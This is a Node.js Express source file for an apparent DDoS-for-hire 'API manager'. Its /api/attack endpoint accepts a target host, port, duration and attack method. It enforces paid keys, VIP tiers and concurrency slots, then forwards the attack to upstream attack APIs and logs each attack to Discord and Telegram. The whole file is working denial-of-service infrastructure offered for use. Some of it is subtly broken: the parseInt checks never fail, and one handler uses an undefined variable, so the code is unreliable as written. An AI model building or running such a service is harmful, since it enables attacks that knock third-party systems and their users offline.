const express = require("express");
const app = express();
const router = express.Router();

const fs = require("fs");
const moment = require("moment")
const { Webhook, MessageBuilder } = require("discord-webhook-node");
const clc = require('cli-color');

const { parseJsonFile } = require('./functions/parseJsonFile');
const { attack_logs } = require('./functions/attack_logs');
const { sendAPI } = require('./functions/apis');
const { sendTelegramWebhook } = require('./functions/telegram');

const now = new Date();
const year = now.getFullYear();
const month = ('0' + (now.getMonth() + 1)).slice(-2);
const day = ('0' + now.getDate()).slice(-2);
const options = { hour12: false };
const time = now.toLocaleTimeString([], options);
const formattedDate = `${year}/${month}/${day} ${time}`;
exports.formattedDate = formattedDate;

const read_config = fs.readFileSync("./assets/json_files/config.json");
let config = JSON.parse(read_config);

const API = fs.readFileSync("./assets/json_files/methods.json");
let apis = JSON.parse(API);

const KEYS = fs.readFileSync("./assets/json_files/keys.json");
let keyData = JSON.parse(KEYS);

let slots_taken = 0;
let method_slots = {};
let key_slots = {}
let attacked_hosts = {}

parseJsonFile('./assets/json_files/keys.json');
parseJsonFile('./assets/json_files/config.json');
parseJsonFile('./assets/json_files/methods.json');


console.log(`${clc.whiteBright.bold()}[${formattedDate}] ${clc.blueBright('Catto')} Manager Webserver ${clc.green.bold('Started')} on Port ${config.webserver_settings.port}`);
console.log(`${clc.whiteBright.bold()}[${formattedDate}] ${clc.blueBright('Catto')} Manager Started ${clc.green.bold('Successfully')}`);

app.listen(config.webserver_settings.port)



app.set("view engine", "js");
app.set("trust proxy", 1);

app.get("/", (_req, res) => {
  res.status(200).json(`Catto API Manager, Made by Kitty.`);
});

app.get("/api/attack", async (req, res) => {
  const KEYS = fs.readFileSync("./assets/json_files/keys.json");
  let keyData = JSON.parse(KEYS);
  const METHODS = fs.readFileSync("./assets/json_files/methods.json");
  let apis = JSON.parse(METHODS);
  const host = req.query.host;
  const port = req.query.port;
  const time = req.query.time;

  const startTime = process.hrtime();

  const elapsedTime = process.hrtime(startTime);
  const durationInMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
  const method = req.query.method;
  const key = req.query.key;
  const username = req.query.username;




  try {
    parseInt(time);
  } catch (err) {
    return res.send({ "error": true, "message": "time must be an integer." });
  }

  try {
    parseInt(port);
  } catch (err) {
    return res.send({ "error": true, "message": "port must be an integer." });
  }
  if (!keyData[key]) return res.send({ "error": true, "message": "invalid key." });
  if (!keyData[key].user) return res.send({ "error": true, "message": "invalid username" });
  if (keyData[key].banned == true) return res.send({ "error": true, "message": "key is banned." });
  if (config.attack_settings.attacks.enabled == false) return res.send({ "error": true, "message": "Attacks are Disabled." })
  if (!(host && port && time && method && key && username)) return res.send({ "error": true, "message": "missing parameters." });
  if (!apis[method]) return res.send({ "error": true, "message": "invalid method." });
  if (method_slots[method] == apis[method].slots) return res.send({ "error": true, "message": "Maximium Slots Reached for This Method. Please Wait" })
  if (keyData[key].vip == false && apis[method].network == "vip") return res.send({ "error": true, "message": "You need vip access." });
  if (config.attack_settings.blackisted_hosts.includes(host)) return res.send({ "error": true, "message": "host is blacklisted." });
  if (time > keyData[key]["time"]) return res.send({ "error": true, "message": "maximum time reached." });
  if (time > apis[method].maxtime) return res.send({ "error": true, "message": "maximum time reached for this method." });
  if (key_slots[key] == keyData[key].maxCons) return res.send({ "error": true, "message": "maximum concurrents reached." });
  if (slots_taken == config.attack_settings.attacks.max_slots) return res.send({ "error": true, "message": "Maximium Slots Reached. Please Wait" })
  if (attacked_hosts.hasOwnProperty(host)) return res.send({ "error": true, "message": "Host is already being attacked." });

  if ("expiry" in keyData[key]) {
    const expiry = moment(keyData[key].expiry.toString(), ["MMMM DD, YYYY", "x", "X", "MM/DD/YYYY"]);
    if (expiry.isSameOrBefore(moment())) return res.status(401).json({ error: true, message: "Key has expired." });
  }

  const user = (keyData[key].user);
  const main = new Webhook(config.discord_settings.webhook_settings.webhook);

  const colour = config.discord_settings.webhook_settings.embed_colour;

  const net = new MessageBuilder()
    .setTitle("API Logs")
    .setColor(`${colour}`)
    .addField(`Host`, `${host}`, true)
    .addField(`Port`, `${port}`, true)
    .addField(`Time`, `${time}`, true)
    .addField(`Method`, `${method}`, true)
    .addField(`Key`, `${key}`, true)
    .addField(`User`, `${user}`, true)
    .setTimestamp();

  if (config.log_settings.telegram_logs == true) {
    sendTelegramWebhook(config.telegram_settings.bot_token, config.telegram_settings.chat_id, `User: ${keyData[key].user}\nKey: ${key}\nHost: ${host}\nPort: ${port}\nTime: ${time}\nMethod: ${method}`)
  }
  if (config.log_settings.webhook_logs == true) {
    main.send(net);
  }
  if (config.log_settings.attack_logs == true) {
    attack_logs(`User: ${keyData[key].user} | Key: ${key}| Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`)
  }
  if (config.log_settings.console_logs == true) {
    console.log(`[1;37m[${formattedDate}] Key: ${key} | Username: ${user} | Host: ${host} | Port: ${port} | Time: ${time} | Method: ${method}`)
  }

    sendAPI(host, port, time, method)

  

  attacked_hosts[host] = true;
  key_slots[key] = (key_slots[key] || 0) + 1;
  slots_taken += 1;
  method_slots[method] = (method_slots[method] || 0) + 1;

  const sent = {
    Host: host,
    Port: port,
    Time: time,
    Method: method,
    running: `${key_slots[key]}/${keyData[key].maxCons}`,
    vip: keyData[key].vip,
    tts: durationInMs + "ms",
  };
  const json = JSON.stringify(sent, null, 2); // Convert JSON object to string

  res.setHeader('Content-Type', 'application/json');
  res.send(json);

  setTimeout(() => {
    method_slots[method] -= 1;
    slots_taken -= 1;
    key_slots[key] -= 1;
    delete attacked_hosts[host];
  }, parseInt(time) * 1000);
});


app.get("/api/methods", (req, res) => {

  let query = req.query;
  let keys = JSON.parse(fs.readFileSync("./assets/json_files/keys.json", "UTF-8").toString());
  let methods = JSON.parse(fs.readFileSync("./assets/json_files/methods.json", "UTF-8").toString());

  if (!query.key) return res.json({ error: true, message: "Invalid API key" });

  if (query.key) {
    if (keys[query.key]) {
      res.json({ error: false, methods: Object.keys(methods) });

    } else {
      return res.status(401).json({ error: true, message: "Invalid API key" });
    }
  } else {
    return res.status(400).json({ error: true, message: "Please provide a key" });
  }
});





app.get("/api/key_info", (req, res) => {

  let key = req.query.key;

  if (!key) return res.json({ error: true, message: "Invalid API key" });

  if (key) {
    if (keyData[key]) {
      res.json({ error: false, username: keys[key].user, expiry: keys[key].expiry, max_cons: keys[key].maxCons, vip: keys[key].vip });

    } else {
      return res.status(401).json({ error: true, message: "Invalid API key" });
    }
  } else {
    return res.status(400).json({ error: true, message: "Please provide a key" });
  }
});



module.exports = { router };